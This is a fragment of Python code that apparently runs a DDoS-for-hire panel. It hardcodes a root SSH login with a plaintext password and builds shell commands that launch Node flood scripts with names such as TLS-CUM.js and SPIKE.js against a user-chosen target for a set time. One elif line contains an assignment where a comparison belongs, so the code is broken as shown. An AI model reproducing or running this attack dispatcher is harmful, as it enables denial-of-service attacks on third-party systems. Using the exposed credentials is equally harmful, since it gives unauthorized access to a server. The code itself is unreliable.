...
ssh_servers = [
    {
        'hostname': '91.206.179.143',
        'port': 55165,
        'username': 'root',
        'password': 'btch-r0XDm9Oa'
    }
]
...
def execute_command():
    ...
    if method.upper() == 'TLS-TOBAT':
        command = f"screen -dm timeout {duration} node TLS-TOBAT.js {target} {duration} "
    elif method.upper() == 'TLS-CUM':
        command = f"screen -dm timeout {duration} node TLS-CUM.js GET {target} {duration} 64 11"
    elif method.upper() == 'SPIKE':
        command = f"screen -dm timeout {duration} node SPIKE.js {target} 100 {duration}"
    elif method.upper() = 'VIP-TLS':
        command = f"screen -dm timeout {duration} node naruto.js {target} 100 1024 {duration}"            
...
if __name__ == '__main__':
    scheduler.start()
    remove_expired_keys()
    app.run(host='91.206.179.143', port=55165)
